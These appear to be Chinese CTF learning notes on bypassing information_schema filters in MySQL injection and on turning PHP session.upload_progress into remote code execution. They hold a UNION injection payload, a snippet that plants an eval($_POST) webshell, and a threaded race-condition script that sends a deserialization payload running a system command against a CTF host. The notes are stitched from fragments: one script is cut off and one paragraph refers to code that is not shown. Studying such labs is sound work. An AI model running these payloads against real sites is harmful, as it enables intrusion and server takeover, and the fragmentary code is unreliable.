学到的：

前提：如果waf或其它过滤了information_schema关键字，那我们该如何获取元数据呢？

能够代替information_schema的有：

  • sys.schema_auto_increment_columns

  • sys.schema_table_statistics_with_buffer

  • x$schema_table_statistics_with_buffer

  • mysql.innodb_table_stats

  • mysql.innodb_table_index

以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入

id=0'union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/'1

利用session.upload_progress进行文件包含和反序列化渗透

详解如何利用session.upload_progress文件包含进行RCE

import requests
import threading
import io

sess_id = "hybcx"  # sess拼接的文件名

catalogue = "/tmp"  # 存放session文件的目录

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        data = {"PHP_SESSION_UPLOAD_PROGRESS": f"{sess_id}<?php eval($_POST[1]);?>{sess_id}"}

这些session的相关信息，都会在我们上传文件的时候，携带进去。

理一下思路：这种题目的思路主要是靠session.upload_process功能，当这个功能开启的时候，如果我们向服务器上传文件，PHP就会把该文件的信息（如上传时间、上传进度）等存储在session中；另外session还有一个模块：session.use_strict_mode（默认为0）这种情况下，用户可以自定义自己的sessionid，例如当用户在cookie中设置sessionid=hybcx，那PHP就会生成一个文件/tmp/sess_hybcx，此时就相当于初始化了session，并且会将上传的文件信息写入到该文件中（这里可以想到，写入一句话木马，让其附带在文件信息中）。

至于这个一句木马如何写入，方法如下：PHP在上述条件下会自定初始化session，同时会产生一个键值，键值的组成为

ini.get("session.upload_progress.prefix")+session.upload_progress.name组成 //最终被写入到上述的sess_hybcx文件中

这也是我们给data赋值为上述值的原因。同时，这里还有个默认配置session.upload_progress.cleanup = on（文件上传后，session中的文件内容立即被清空），这意味着我们就需要竞争了。

首先将get传参进去的变量的值与题目自定义给的user变量的值进行拼接，注意这里拼接选择的是+，那如果我们这两个参数都是数字的话，那拼接之后结果就是两数字相加的结果。并且这一段代码之后提示我们，user变量不是以数组开头的，这意味着开头就是字母。

在 PHP 中，一个类的成员属性可以在对象中动态添加和修改，无论这个属性是否被定义过。如果尝试给一个没有被定义的属性赋值，PHP 会自动将这个属性添加到类中，并赋予它所需的值。

在这个代码示例中，虽然在类中没有直接定义 $p 属性，但当这个属性第一次被赋值时，PHP 会自动将这个属性添加到对象中。这个过程也称为属性动态定义（Dynamic Property Definition）。

由于提交的时候没有发现执行命令的回显，猜测session.upload_progress.cleanup 被设置成了 On, session 清空导致来不及反序列化。

解决方法就是利用条件竞争, 在 post 表单的同时携带相同 PHPSESSID 的 cookie 去访问这个 webshell

import threading
import requests

url = 'http://node5.anna.nssctf.cn:22319/Rea1web3he11.php'
flag = 'hybcx'

cmd = "system('cat /secret/flag');"

payload = r'|O:8:"webshell":1:{s:7:"caution";O:9:"execution":1:{s:3:"cmd";s:' + str(len(cmd)) + ':"' + cmd + '";}}'

def upload():
    files = [
        ('file', ('xx.txt', 'xxx'*10240)),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}

    while True:
        res = requests.post(url, data=data, files=files, cookies={'PHPSESSID': flag})
        print('upload',res.text)

def write():
    while True:
        res = requests.get(url, cookies={'PHPSESSID': flag})
        print('write',res.text)

for i in range(10):
    t1 = threading.Thread(target=upload)
    t2 = threading.Thread(target=write)
    t1.start()
    t2.start()
